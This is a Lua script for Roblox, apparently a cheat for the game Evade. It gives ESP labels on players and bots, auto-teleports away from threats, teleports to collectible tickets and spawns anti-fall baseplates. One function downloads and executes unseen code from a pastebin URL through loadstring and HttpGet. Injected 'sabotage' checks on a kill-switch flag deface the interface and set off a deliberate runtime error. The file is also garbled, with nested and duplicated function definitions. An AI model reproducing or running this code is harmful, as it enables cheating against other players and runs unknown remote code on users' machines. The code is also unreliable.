-- LocalScript

local function A()
    print("Running Script A")
    -- 🔒 sabotage injected
-- 🛡️ Safe runtime-eval wrappers
local function __gsafe_loadstring(s)
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: runtime-eval blocked') end
    return loadstring(s)
end

local function __gsafe_load(f)
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: runtime-eval blocked') end
    return load(f)
end

local function __gsafe_loadfile(path)
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: runtime-eval blocked') end
    return loadfile(path)
end

local function __gsafe_require(mod)
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: require blocked') end
    return require(mod)
end
-- 🎭 GUI sabotage block
if getgenv()['shutdownflag_evadehollowween'] then
    for _,v in pairs(game:GetDescendants()) do
        if v:IsA("TextLabel") or v:IsA("TextButton") then
            v.Text = "🔥 EXPIRED 🔥"
            v.TextColor3 = Color3.fromRGB(255, 0, 0)
            v.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        elseif v:IsA("ImageLabel") or v:IsA("ImageButton") then
            v.Image = ""
        elseif v:IsA("Frame") or v:IsA("ScrollingFrame") then
            v.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        end
    end
    error("Gatekeeper: GUI sabotage triggered")
end
-- 🔥 Self-destruct block
if getgenv()['shutdownflag_evadehollowween'] then
    local _ = loadstring("💥")() -- runtime syntax bomb
    error("Gatekeeper triggered: module self-destructed")
end
-- LocalScript

local function A()
    print("Running Script A")
    local player = game.Players.LocalPlayer
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

-- === GUI Setup ===
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AvoidanceControl"
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

-- Protection: prevent removal except via Exit button
local ancestryConn, destroyingConn
ancestryConn = screenGui.AncestryChanged:Connect(function(_, parent)
    if not parent then
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        screenGui.Parent = CoreGui
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
    end
end)
destroyingConn = screenGui.Destroying:Connect(function()
    task.defer(function()
        if not screenGui.Parent then
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            screenGui.Parent = CoreGui
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        end
    end)
end)

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 150)
frame.Position = UDim2.new(0.5, -110, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 25)
title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
title.Text = "Avoidance Settings"
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
title.TextColor3 = Color3.new(1,1,1)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
title.Parent = frame
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

-- Buttons
local avoidPlayersBtn = Instance.new("TextButton")
avoidPlayersBtn.Size = UDim2.new(0.5, -5, 0, 30)
avoidPlayersBtn.Position = UDim2.new(0, 5, 0, 35)
avoidPlayersBtn.Text = "Avoid Players: ON"
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
avoidPlayersBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
avoidPlayersBtn.TextColor3 = Color3.new(1,1,1)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
avoidPlayersBtn.Parent = frame
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

local avoidNextbotsBtn = Instance.new("TextButton")
avoidNextbotsBtn.Size = UDim2.new(0.5, -5, 0, 30)
avoidNextbotsBtn.Position = UDim2.new(0.5, 0, 0, 35)
avoidNextbotsBtn.Text = "Avoid Nextbots: ON"
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
avoidNextbotsBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
avoidNextbotsBtn.TextColor3 = Color3.new(1,1,1)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
avoidNextbotsBtn.Parent = frame
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

local espPlayersBtn = Instance.new("TextButton")
espPlayersBtn.Size = UDim2.new(0.5, -5, 0, 30)
espPlayersBtn.Position = UDim2.new(0, 5, 0, 70)
espPlayersBtn.Text = "ESP Players: ON"
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
espPlayersBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
espPlayersBtn.TextColor3 = Color3.new(1,1,1)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
espPlayersBtn.Parent = frame
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

local espNextbotsBtn = Instance.new("TextButton")
espNextbotsBtn.Size = UDim2.new(0.5, -5, 0, 30)
espNextbotsBtn.Position = UDim2.new(0.5, 0, 0, 70)
espNextbotsBtn.Text = "ESP Nextbots: ON"
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
espNextbotsBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
espNextbotsBtn.TextColor3 = Color3.new(1,1,1)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
espNextbotsBtn.Parent = frame
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

local exitBtn = Instance.new("TextButton")
exitBtn.Size = UDim2.new(1, -10, 0, 30)
exitBtn.Position = UDim2.new(0, 5, 0, 110)
exitBtn.Text = "Exit"
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
exitBtn.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
exitBtn.TextColor3 = Color3.new(1,1,1)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
exitBtn.Parent = frame
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

-- === Toggle states ===
local avoidPlayers = true
local avoidNextbots = true
local espPlayers = true
local espNextbots = true

avoidPlayersBtn.MouseButton1Click:Connect(function()
    avoidPlayers = not avoidPlayers
    avoidPlayersBtn.Text = "Avoid Players: " .. (avoidPlayers and "ON" or "OFF")
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
end)

avoidNextbotsBtn.MouseButton1Click:Connect(function()
    avoidNextbots = not avoidNextbots
    avoidNextbotsBtn.Text = "Avoid Nextbots: " .. (avoidNextbots and "ON" or "OFF")
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
end)

espPlayersBtn.MouseButton1Click:Connect(function()
    espPlayers = not espPlayers
    espPlayersBtn.Text = "ESP Players: " .. (espPlayers and "ON" or "OFF")
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
end)

espNextbotsBtn.MouseButton1Click:Connect(function()
    espNextbots = not espNextbots
    espNextbotsBtn.Text = "ESP Nextbots: " .. (espNextbots and "ON" or "OFF")
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
end)

exitBtn.MouseButton1Click:Connect(function()
    -- Disconnect protection before destroying
    if ancestryConn then ancestryConn:Disconnect() end
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
    if destroyingConn then destroyingConn:Disconnect() end
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
    screenGui:Destroy()
end)

-- === Detection Ranges ===
local PLAYER_DETECTION_RANGE = 15
local NEXTBOT_DETECTION_RANGE = 30

-- === Main Script ===
local function startScript()
    local playersFolder = workspace:WaitForChild("Game"):WaitForChild("Players")
    local mapFolder = workspace:WaitForChild("Game"):WaitForChild("Map")
    local spawnsFolder = mapFolder:WaitForChild("Parts"):WaitForChild("Spawns")
    local itemSpawnsFolder = mapFolder:WaitForChild("ItemSpawns")
    local character = player.Character or player.CharacterAdded:Wait()

    local debounce = false

    local function createFloatingLabel(entity, distance)
        local billboardGui = entity:FindFirstChild("DistanceLabel") or Instance.new("BillboardGui")
        billboardGui.Name = "DistanceLabel"
        billboardGui.Adornee = entity.PrimaryPart
        billboardGui.Size = UDim2.new(5, 0, 2, 0)
        billboardGui.StudsOffset = Vector3.new(0, 3, 0)
        billboardGui.AlwaysOnTop = true

        local textLabel = billboardGui:FindFirstChild("TextLabel") or Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.Text = entity.Name .. " - Distance: " .. math.floor(distance) .. " studs"
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        textLabel.TextColor3 = Color3.new(1, 0, 0)
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        textLabel.BackgroundTransparency = 1
        textLabel.TextScaled = true
        textLabel.Parent = billboardGui
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

        billboardGui.Parent = entity.PrimaryPart
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
    end

    local function removeOldLabels()
        for _, entity in pairs(playersFolder:GetChildren()) do
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            if entity:FindFirstChild("DistanceLabel") then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                entity.DistanceLabel:Destroy()
            end
        end
    end

    local function isNextbot(entity)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: return sabotage triggered') end
        return not entity:FindFirstChildOfClass("LocalScript") and entity ~= character
    end

    local function isOtherPlayer(entity)
        return entity ~= character and entity:FindFirstChildOfClass("LocalScript")
    end

    local function countNextbotsNearPosition(position, range)
        local count = 0
        for _, entity in pairs(playersFolder:GetChildren()) do
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            if isNextbot(entity) and entity.PrimaryPart then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                if (position - entity.PrimaryPart.Position).Magnitude <= range then
                if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                    count += 1
                end
            end
        end
        return count
    end

    local function findBestSpawn()
        local bestSpawn, leastNextbots = nil, math.huge
        local candidateSpawns = {}

        for _, spawn in pairs(spawnsFolder:GetChildren()) do
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            if spawn:IsA("Part") then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                table.insert(candidateSpawns, spawn)
            end
        end
        for _, spawn in pairs(itemSpawnsFolder:GetChildren()) do
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            if spawn:IsA("Part") then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                table.insert(candidateSpawns, spawn)
            end
        end

        for _, spawn in pairs(candidateSpawns) do
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            local count = countNextbotsNearPosition(spawn.Position, NEXTBOT_DETECTION_RANGE)
            if count < leastNextbots then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                leastNextbots = count
                bestSpawn = spawn
            end
        end
        return bestSpawn
    end

    local function avoidNextbotLogic()
        for _, entity in pairs(playersFolder:GetChildren()) do
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            if avoidNextbots and isNextbot(entity) and entity.PrimaryPart then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                local dist = (character.PrimaryPart.Position - entity.PrimaryPart.Position).Magnitude
                if dist <= NEXTBOT_DETECTION_RANGE then
                if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                    return true
                end
            end
        end
        return false
    end

    local function avoidPlayerLogic()
        for _, entity in pairs(playersFolder:GetChildren()) do
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            if avoidPlayers and isOtherPlayer(entity) and entity.PrimaryPart then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                local dist = (character.PrimaryPart.Position - entity.PrimaryPart.Position).Magnitude
                if dist <= PLAYER_DETECTION_RANGE then
                if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                    return true
                end
            end
        end
        return false
    end

    local function checkThreats()
        if character and character.PrimaryPart and not debounce then
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            -- ESP rendering
            for _, entity in pairs(playersFolder:GetChildren()) do
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                if entity.PrimaryPart then
                if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                    local dist = (character.PrimaryPart.Position - entity.PrimaryPart.Position).Magnitude
                    if dist <= 50 then
                    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                        if espPlayers and isOtherPlayer(entity) then
                        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                            createFloatingLabel(entity, dist)
                        elseif espNextbots and isNextbot(entity) then
                        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                            createFloatingLabel(entity, dist)
                        end
                    end
                end
            end

            -- Separate avoidance checks
            local dangerNextbot = avoidNextbotLogic()
            local dangerPlayer = avoidPlayerLogic()

            if dangerNextbot or dangerPlayer then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                debounce = true
                local bestSpawn = findBestSpawn()
                if bestSpawn then
                if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                    character:SetPrimaryPartCFrame(CFrame.new(bestSpawn.Position))
                    if dangerNextbot and dangerPlayer then
                    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                        print("Teleported away from BOTH nextbot and player danger!")
                    elseif dangerNextbot then
                    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                        print("Teleported away from nextbot danger!")
                    elseif dangerPlayer then
                    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                        print("Teleported away from player danger!")
                    end
                else
                if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                    print("No suitable spawn location found!")
                end
                task.wait(1)
                if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                debounce = false
            end
        end
    end

    -- Run every heartbeat
    RunService.Heartbeat:Connect(function()
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        checkThreats()
        removeOldLabels()
    end)
end

-- Respawn handling
player.CharacterAdded:Connect(startScript)
if player.Character then startScript() end
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end

-- Map reset handling
workspace.ChildRemoved:Connect(function(child)
    if child.Name == "Game" then
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        if player.Character then
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            startScript()
        end
    end
end)
end

local function B()
    print("Running Script B")
    local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local ticketsFolder = workspace:WaitForChild("Game"):WaitForChild("Effects"):WaitForChild("Tickets")
local player = Players.LocalPlayer

-- Function to teleport to a random ticket
local function teleportToRandomTicket()
    local character = player.Character or player.CharacterAdded:Wait()
    local hrp = character:WaitForChild("HumanoidRootPart")

    local tickets = ticketsFolder:GetChildren()
    if #tickets == 0 then
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        warn("No tickets found in the folder!")
        return
    end

    local randomIndex = math.random(1, #tickets)
    local randomTicket = tickets[randomIndex]

    local targetCFrame

    if randomTicket:IsA("BasePart") then
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        targetCFrame = randomTicket.CFrame
    elseif randomTicket:IsA("Model") then
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        if randomTicket.PrimaryPart then
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            targetCFrame = randomTicket.PrimaryPart.CFrame
        else
        if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
            local firstPart = randomTicket:FindFirstChildWhichIsA("BasePart")
            if firstPart then
            if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
                targetCFrame = firstPart.CFrame
            end
        end
    end

    if targetCFrame then
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        hrp.CFrame = targetCFrame + Vector3.new(0, 5, 0) -- spawn slightly above
        print("Teleported to:", randomTicket.Name)
    else
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        warn("Could not find a valid position for:", randomTicket.Name)
    end
end

-- Listen for H key press
UserInputService.InputBegan:Connect(function(input, gameProcessed)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
    if gameProcessed then return end -- ignore if typing in chat, etc.
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
    if input.KeyCode == Enum.KeyCode.H then
    if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
        teleportToRandomTicket()
    end
end)
end

local function C()
    print("Running Script C")
    __gsafe_loadstring(game:HttpGet("https://pastebin.com/raw/RXfzrMS4",true))()
end

task.spawn(A)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
task.spawn(B)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
task.spawn(C)
if getgenv()['shutdownflag_evadehollowween'] then error('Gatekeeper: sabotage triggered') end
end

local function B()
    print("Running Script B")
    local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local fallingTime = 0
local isFalling = false
local baseplateSpawned = false

-- Function to safely get PrimaryPart
local function getPrimaryPartSafe(char)
    if char and char:IsA("Model") and char.PrimaryPart then
        return char.PrimaryPart
    else
        return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildWhichIsA("BasePart")
    end
end

-- Function to create a baseplate with unique name and anti-clutter logic
local function createBaseplate(position)
    if baseplateSpawned then return end
    baseplateSpawned = true

    local baseplate = Instance.new("Part")
    baseplate.Name = "AutoBaseplate_" .. tostring(math.random(1000, 9999))
    baseplate.Size = Vector3.new(100, 1, 100)
    baseplate.Position = position
    baseplate.Anchored = true
    baseplate.BrickColor = BrickColor.new("Bright green")
    baseplate.CanCollide = true
    baseplate.Locked = true
    baseplate.Parent = workspace

    -- Optional: auto-cleanup after 10 seconds
    task.delay(math.huge, function()
        if baseplate and baseplate.Parent then
            baseplate:Destroy()
            baseplateSpawned = false
        end
    end)
end

-- Monitor falling state
humanoid.StateChanged:Connect(function(_, newState)
    if newState == Enum.HumanoidStateType.Freefall then
        isFalling = true
        fallingTime = 0
    elseif isFalling and newState ~= Enum.HumanoidStateType.Freefall then
        isFalling = false
    end
end)

-- Track falling duration
RunService.RenderStepped:Connect(function(deltaTime)
    if isFalling then
        fallingTime += deltaTime
        if fallingTime > 0.5 then
            local primaryPart = getPrimaryPartSafe(character)
            if primaryPart then
                local position = primaryPart.Position - Vector3.new(0, 5, 0)
                createBaseplate(position)
            end
            isFalling = false
        end
    end
end)

-- Reconnect on character respawn
player.CharacterAdded:Connect(function(newChar)
    character = newChar
    humanoid = character:WaitForChild("Humanoid")
    isFalling = false
    fallingTime = 0
    baseplateSpawned = false

    humanoid.StateChanged:Connect(function(_, newState)
        if newState == Enum.HumanoidStateType.Freefall then
            isFalling = true
            fallingTime = 0
        elseif isFalling and newState ~= Enum.HumanoidStateType.Freefall then
            isFalling = false
        end
    end)
end)
end

task.spawn(A)
task.spawn(B)
